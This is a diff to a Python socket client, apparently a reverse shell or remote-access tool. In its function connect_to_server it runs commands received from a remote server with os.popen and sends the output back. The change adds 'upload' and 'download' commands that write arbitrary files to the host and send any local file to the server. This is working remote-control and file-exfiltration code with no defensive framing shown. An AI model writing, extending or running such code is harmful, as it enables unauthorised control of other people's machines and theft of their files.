@@ -32,12 +32,31 @@ def connect_to_server():
                 print("[*] Exiting...")
                 break
 
-            # Execute the command and get the output
-            output = os.popen(command).read()
-            if not output:
-                output = "Command executed but no output returned."
-            
-            client.sendall(output.encode())
+            if command.startswith('upload'):
+                _, filename = command.split(' ', 1)
+                with open(filename, 'wb') as f:
+                    data = client.recv(4096)
+                    while data:
+                        f.write(data)
+                        data = client.recv(4096)
+                print(f"[*] Received and saved {filename}")
+
+            elif command.startswith('download'):
+                filename = command.split(' ', 1)[1]
+                if os.path.exists(filename):
+                    with open(filename, 'rb') as f:
+                        data = f.read()
+                        client.sendall(data)
+                else:
+                    client.sendall(f"File {filename} not found.".encode())
+
+            else:
+                # Execute the command and get the output
+                output = os.popen(command).read()
+                if not output:
+                    output = "Command executed but no output returned."
+                client.sendall(output.encode())
+                
         except Exception as e:
             print(f"[!] Error: {e}")
             break
